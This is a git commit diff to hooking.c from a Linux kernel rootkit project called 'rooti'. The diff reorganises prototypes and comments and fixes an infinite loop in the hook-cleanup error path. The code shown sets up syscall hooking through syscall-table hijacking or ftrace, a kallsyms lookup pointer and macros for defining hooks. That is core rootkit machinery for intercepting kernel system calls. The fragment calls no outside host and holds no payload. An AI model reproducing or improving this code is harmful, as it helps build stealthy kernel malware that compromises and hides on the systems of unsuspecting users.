7ac7902f001c5e5dc9df77c34e5ed187b0eb5a17
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-05-23 15:34:57 +0000

    Fixed the bug and renamed the file

--- hooking.c
+++ hooking.c
@@ -3,13 +3,20 @@
 #include <linux/version.h>
 
 /*
-Different methods of syscall hooking supported by this rootkit. The macro ROOTI_HOOKING_METHOD defined below
-is meant to be set euqal one the these options, and it indicates the chosen hooking method.
+    Different methods of syscall hooking supported by this rootkit. The macro ROOTI_HOOKING_METHOD defined below
+    is meant to be set euqal one the these options, and it indicates the chosen hooking method.
 */
 #define ROOTI_METHOD_TABLE_HIJACKING 0  // Classic method of overriding the pointer in the syscall table, works on older kernels
 #define ROOTI_METHOD_FTRACE 1           // Intercepting syscalls by registering an ftrace callback to handlers and modifying IP reg
 
 #define ROOTI_HOOKING_METHOD ROOTI_METHOD_FTRACE
+
+/* Public functions prototypes */
+int rooti_hooking_init(void);
+int rooti_install_hook(struct rooti_syscall_hook *hook);
+int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count);
+void rooti_uninstall_hook(struct rooti_syscall_hook *hook);
+void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);
 
 unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;
 
@@ -31,21 +38,14 @@ struct rooti_syscall_hook {
 #endif
 };
 
-/* PROTOTYPES */
-int rooti_hooking_init(void);
-int rooti_install_hook(struct rooti_syscall_hook *hook);
-int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count);
-void rooti_uninstall_hook(struct rooti_syscall_hook *hook);
-void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);
-
-// On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'.
+/* On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'. */
 #ifdef CONFIG_X86_64
 #define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
 #else
 #define ROOTI_SYSCALL_NAME(name) (name)
 #endif
 
-// Shorthand for initializing syscall hook objects
+/* Shorthand for initializing syscall hook objects */
 #define ROOTI_HOOK(_name, _hook, _orig) \
 { \
     .name = ROOTI_SYSCALL_NAME(_name), \
@@ -356,7 +356,7 @@ int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count)
 
 error:
     while (i > 0) {
-        rooti_uninstall_hook(&hooks[i]);
+        rooti_uninstall_hook(&hooks[--i]);
     }
     return ret;
 }
